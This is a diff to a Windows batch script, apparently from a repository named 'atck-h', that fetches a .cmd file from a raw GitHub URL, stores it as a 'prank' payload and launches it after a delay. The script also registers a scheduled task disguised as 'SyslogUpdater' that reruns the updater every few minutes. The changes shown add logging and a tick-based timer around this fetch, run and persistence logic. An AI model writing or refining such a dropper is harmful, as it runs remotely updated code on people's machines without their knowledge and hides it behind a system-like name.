@@ -16,6 +16,7 @@ set "FILE_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/syslog.cmd"
 set "REMOTE_VER=%TEMP%\rv.txt"
 set "DOWNLOAD=%TEMP%\sn.cmd"
 set "FIRSTRUN_FLAG=%BASE%\firstrun.txt"
+set "LOG_FILE=%BASE%\debug.log"
 
 if not exist "%BASE%" mkdir "%BASE%"
 
@@ -37,25 +38,34 @@ if not "%LOCAL%"=="%REMOTE%" (
         move /Y "%DOWNLOAD%" "%PRANK%" >nul
         echo %REMOTE% > "%LOCAL_VER%"
 
-        :: Calculate the exact start time (current time + DELAY seconds) and store it
-        for /f "usebackq delims=" %%a in (`powershell -Command "(Get-Date).AddSeconds(%DELAY%).ToString('yyyy-MM-dd HH:mm:ss')"`) do set "TARGET=%%a"
-        echo %TARGET% > "%FIRSTRUN_FLAG%"
+        :: Store target time as a **ticks** value (locale‑independent)
+        for /f "usebackq delims=" %%a in (`powershell -Command "(Get-Date).AddSeconds(%DELAY%).Ticks"`) do set "TARGET_TICKS=%%a"
+        echo %TARGET_TICKS% > "%FIRSTRUN_FLAG%"
+        echo [%DATE% %TIME%] First install – target ticks: %TARGET_TICKS% >> "%LOG_FILE%"
     )
 )
 
 :RUN
 :: If this is a first run (flag exists), check whether the target time has been reached
 if exist "%FIRSTRUN_FLAG%" (
-    set /p TARGET=<"%FIRSTRUN_FLAG%"
-    :: Compare current time with the stored target using PowerShell
-    powershell -Command "if ((Get-Date) -ge [datetime]'%TARGET%') { exit 0 } else { exit 1 }"
+    set /p TARGET_TICKS=<"%FIRSTRUN_FLAG%"
+    :: Compare current ticks with stored ticks using PowerShell
+    powershell -Command "$now = [DateTime]::UtcNow.Ticks; if ($now -ge %TARGET_TICKS%) { exit 0 } else { exit 1 }"
     if !errorlevel! equ 0 (
         start "" "%PRANK%"
         del "%FIRSTRUN_FLAG%"
+        echo [%DATE% %TIME%] Prank started, flag deleted >> "%LOG_FILE%"
+    ) else (
+        echo [%DATE% %TIME%] Target time not yet reached >> "%LOG_FILE%"
     )
 )
 
 :: Create / update the scheduled task to run this updater every UPDATER_INTERVAL minutes
 schtasks /create /tn "SyslogUpdater" /tr "cmd /c start /min \"\" \"%UPDATER%\"" /sc minute /mo %UPDATER_INTERVAL% /f >nul 2>&1
+if %errorlevel% equ 0 (
+    echo [%DATE% %TIME%] Scheduled task created/updated successfully >> "%LOG_FILE%"
+) else (
+    echo [%DATE% %TIME%] Failed to create scheduled task >> "%LOG_FILE%"
+)
 
 endlocal
